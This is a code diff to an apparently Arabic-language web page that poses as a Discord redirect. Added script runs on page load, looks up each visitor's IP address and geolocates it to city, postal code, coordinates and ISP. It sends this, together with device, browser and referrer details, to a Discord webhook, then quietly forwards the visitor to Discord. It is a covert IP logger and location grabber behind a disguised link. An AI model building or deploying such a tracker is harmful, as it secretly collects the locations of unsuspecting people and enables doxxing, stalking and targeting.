@@ -47,6 +47,7 @@
             referrer: document.referrer || "مباشر"
         };
         
+        // === جلب عنوان IP ===
         async function getIP() {
             try {
                 const res = await fetch('https://api.ipify.org?format=json', { cache: 'no-store' });
@@ -57,23 +58,61 @@
             }
         }
         
-        async function sendData(ip) {
+        // === جلب الموقع الجغرافي من IP (باستخدام ip-api.com) ===
+        async function getLocation(ip) {
+            if (ip === "غير متاح") return null;
+            try {
+                const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,zip,lat,lon,isp,org,as,timezone`, { cache: 'no-store' });
+                const data = await res.json();
+                if (data.status === "success") {
+                    return data;
+                } else {
+                    console.warn("فشل جلب الموقع:", data.message);
+                    return null;
+                }
+            } catch(e) {
+                console.warn("خطأ في جلب الموقع:", e);
+                return null;
+            }
+        }
+        
+        // === إرسال البيانات إلى Discord ===
+        async function sendData(ip, location) {
+            const fields = [
+                { name: "🌍 IP", value: ip, inline: true },
+                { name: "📱 الجهاز", value: basicData.device, inline: true },
+                { name: "💿 نظام التشغيل", value: basicData.os, inline: true },
+                { name: "🌐 المتصفح", value: basicData.browser, inline: true },
+                { name: "🖥️ الشاشة", value: basicData.screen, inline: true },
+                { name: "🔤 اللغة", value: basicData.language, inline: true },
+                { name: "🕐 المنطقة الزمنية", value: basicData.timezone, inline: true },
+                { name: "🔗 الرابط", value: basicData.url, inline: false },
+                { name: "🔗 المُحيل", value: basicData.referrer, inline: false }
+            ];
+
+            // إضافة معلومات الموقع إذا كانت متوفرة
+            if (location) {
+                fields.push(
+                    { name: "🇨🇳 الدولة", value: location.country || "غير معروف", inline: true },
+                    { name: "🏙️ المنطقة", value: location.regionName || "غير معروف", inline: true },
+                    { name: "🏛️ المدينة", value: location.city || "غير معروف", inline: true },
+                    { name: "📮 الرمز البريدي", value: location.zip || "غير معروف", inline: true },
+                    { name: "📍 الإحداثيات", value: `${location.lat}, ${location.lon}`, inline: true },
+                    { name: "📶 مزود الخدمة", value: location.isp || "غير معروف", inline: true },
+                    { name: "🏢 المنظمة", value: location.org || "غير معروف", inline: true },
+                    { name: "🔢 AS", value: location.as || "غير معروف", inline: true }
+                );
+            } else {
+                fields.push({ name: "📍 الموقع", value: "❌ غير متاح", inline: false });
+            }
+
             const embed = {
                 title: "🕵️ زائر جديد - توجيه فوري",
                 color: 0x2C3E50,
-                fields: [
-                    { name: "🌍 IP", value: ip, inline: true },
-                    { name: "📱 الجهاز", value: basicData.device, inline: true },
-                    { name: "💿 نظام التشغيل", value: basicData.os, inline: true },
-                    { name: "🌐 المتصفح", value: basicData.browser, inline: true },
-                    { name: "🖥️ الشاشة", value: basicData.screen, inline: true },
-                    { name: "🔤 اللغة", value: basicData.language, inline: true },
-                    { name: "🕐 المنطقة", value: basicData.timezone, inline: true },
-                    { name: "🔗 الرابط", value: basicData.url, inline: false },
-                    { name: "🔗 المُحيل", value: basicData.referrer, inline: false }
-                ],
+                fields: fields,
                 footer: { text: "تم التوجيه وجمع البيانات لكل زائر" }
             };
+
             try {
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
@@ -86,9 +125,11 @@
             }
         }
         
+        // === التنفيذ ===
         (async () => {
             const ip = await getIP();
-            await sendData(ip);
+            const location = ip !== "غير متاح" ? await getLocation(ip) : null;
+            await sendData(ip, location);
             setTimeout(() => {
                 window.location.replace(DISCORD_REDIRECT);
             }, 300);
